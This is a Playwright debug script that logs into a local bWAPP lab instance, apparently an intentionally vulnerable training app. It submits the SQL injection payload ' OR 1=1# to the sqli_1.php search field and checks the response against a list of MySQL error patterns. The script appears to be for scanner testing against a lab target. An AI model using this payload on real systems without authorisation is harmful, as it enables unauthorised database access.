import { chromium } from 'playwright';

async function debug() {
  const browser = await chromium.launch();
  const context = await browser.newContext({ storageState: 'storage-states/bwapp-auth.json' });
  const page = await context.newPage();
  
  console.log('Navigating to SQLi page...');
  await page.goto('http://localhost:8080/sqli_1.php');
  console.log('Page loaded:', page.url());
  
  // Check if we are authenticated
  const pageContent = await page.content();
  if (pageContent.includes('Please login')) {
    console.log('WARNING: Not authenticated! Login form detected.');
    await browser.close();
    return;
  }
  
  // Find the form
  const input = await page.$('input[name="title"]');
  if (!input) {
    console.log('ERROR: Input not found!');
    console.log('Page content:', pageContent.substring(0, 500));
    await browser.close();
    return;
  }
  console.log('Input found');
  
  // Try a simple SQLi payload
  console.log('Injecting payload: \' OR 1=1#');
  await page.fill('input[name="title"]', "' OR 1=1#");
  
  // Find submit button
  const submitBtn = await page.$('input[type="submit"], button[type="submit"]');
  if (submitBtn) {
    console.log('Submit button found, clicking...');
    await submitBtn.click();
  } else {
    console.log('No submit button found, pressing Enter...');
    await page.press('input[name="title"]', 'Enter');
  }
  
  // Wait for response
  await page.waitForTimeout(2000);
  
  // Get response body
  const body = await page.content();
  console.log('\n--- Response Body (first 3000 chars) ---');
  console.log(body.substring(0, 3000));
  
  // Check for error patterns
  const errorPatterns = [
    /Warning:.*mysql/i,
    /mysqli_.*\(\).*expects/i,
    /You have an error in your SQL syntax/i,
    /mysql_fetch_array/i,
    /mysql_num_rows/i,
    /SQL syntax.*?error/i,
    /syntax error.*?SQL/i,
    /error.*?in.*?query/i,
  ];
  
  console.log('\n--- Error Pattern Matches ---');
  let foundError = false;
  for (const pattern of errorPatterns) {
    if (pattern.test(body)) {
      console.log('MATCH:', pattern.source);
      foundError = true;
    }
  }
  
  if (!foundError) {
    console.log('No SQL error patterns found in response');
  }
  
  await browser.close();
}

debug().catch(console.error);
